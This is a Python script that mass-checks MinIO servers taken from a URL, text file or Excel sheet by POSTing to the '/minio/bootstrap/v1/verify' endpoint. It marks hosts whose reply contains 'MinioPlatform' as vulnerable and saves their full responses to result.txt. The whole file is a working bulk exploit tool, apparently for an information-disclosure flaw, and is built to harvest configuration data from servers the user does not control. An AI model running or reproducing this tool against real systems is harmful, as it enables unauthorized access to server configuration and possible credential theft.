import pandas as pd
import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

payload = "/minio/bootstrap/v1/verify"

proxies = {
"http":"http://127.0.0.1:1080",
"https":"https://127.0.0.1:1080"
}
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
}

domain = []
vulndomain = []
#get url from txt
def readTxt(targetFile):
    with open(targetFile,'r') as f:
        for line in f:
            domain.append(line.strip('\n'))

#get url from specific excel row
def readExcel(excel_name,sheet_name,row_name):
    df = pd.read_excel(excel_name, sheet_name=sheet_name)
    for index, row in df.iterrows():
        domain.append(row[row_name])

def vulnDetect():
    for i in domain:
        s = requests.session()
        s.keep_alive = False
        url = i + payload
        data = {}
        res = s.post(url,data,verify= False,timeout= 10).text
        if 'MinioPlatform' in res:
            print("[+] vuln detect!! the target url is " + url)
            vulndomain.append(i)
        else:
            print(i + " expliot fail")
    vulnResult()

def vulnResult():
    m = open('result.txt',"w")
    for i in vulndomain:
        s = requests.session()
        s.keep_alive = False
        url = i + payload
        data = {}
        res = s.post(url,data,verify= False,timeout= 10).text
        print(i,res,file=m)
        print("-----------------------------------------------------------------------------------------------",file=m)
    print("[*] result file is in result.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="读取命令行参数")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--url', help='目标url')
    group.add_argument('--txt',help="txt文件")
    group.add_argument('--excel', nargs=3, metavar=('excel_name', 'sheet_name', 'row_name'), help='excel文件名、sheet名称和列名称')
    args = parser.parse_args()
    if args.url:
        domain.append(args.url)
        vulnDetect()
        domain.clear()
    elif args.txt:
        readTxt(args.txt)
        vulnDetect()
        domain.clear()
        vulndomain.clear()
    elif args.excel:
        excel_name, sheet_name, row_name = args.excel
        readExcel(excel_name,sheet_name,row_name)
        vulnDetect()
        domain.clear()
        vulndomain.clear()